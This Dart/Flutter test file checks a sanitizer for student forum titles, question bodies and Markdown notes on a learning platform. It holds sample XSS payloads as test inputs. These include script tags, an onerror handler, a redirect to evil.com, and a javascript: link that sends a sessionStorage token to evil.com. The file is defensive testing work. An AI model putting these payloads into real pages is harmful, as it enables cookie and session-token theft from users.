// Desenvolvido por Alex Gabriel Soares Sousa - RA: 24802449

import 'package:flutter_test/flutter_test.dart';
import 'package:agmrm_security/student/sanitizers/student_forum_content_sanitizer.dart';

void main() {
  group('StudentForumContentSanitizer Tests', () {
    test('Higieniza título de dúvida no Fórum AVA removendo quaisquer tags HTML', () {
      final input = 'Dúvida na entrega <script>stealCookies()</script> Trabalho 1';
      final sanitized = StudentForumContentSanitizer.sanitizeForumTitle(input);

      expect(sanitized, equals('Dúvida na entrega stealCookies() Trabalho 1'));
      expect(sanitized.contains('<script>'), isFalse);
    });

    test('Neutraliza scripts, iframes e manipuladores de eventos em corpo de dúvida', () {
      final input = '''
Olá colegas, vejam esta imagem:
<img src="x" onerror="alert('xss')" />
E este script:
<script>document.location='http://evil.com'</script>
Alguém conseguiu resolver o exercício 3?
''';
      final sanitized = StudentForumContentSanitizer.sanitizeForumBody(input);

      expect(sanitized.contains('<script>'), isFalse);
      expect(sanitized.contains('onerror='), isFalse);
      expect(sanitized.contains('Alguém conseguiu resolver'), isTrue);
    });

    test('Sanitiza caderno de anotações em Markdown substituindo URIs javascript por links bloqueados', () {
      final markdown = '''
# Minhas Anotações de Redes
- [Documentação Oficial](https://dart.dev)
- [Cheat Sheet Maliciosa](javascript:fetch('//evil.com/?token='+sessionStorage.token))
- [Outro Link Seguro](https://github.com)
''';
      final sanitized = StudentForumContentSanitizer.sanitizePersonalNotes(markdown);

      expect(sanitized.contains('javascript:'), isFalse);
      expect(sanitized.contains('[Cheat Sheet Maliciosa](#link-bloqueado-por-seguranca)'), isTrue);
      expect(sanitized.contains('https://dart.dev'), isTrue);
    });
  });
}
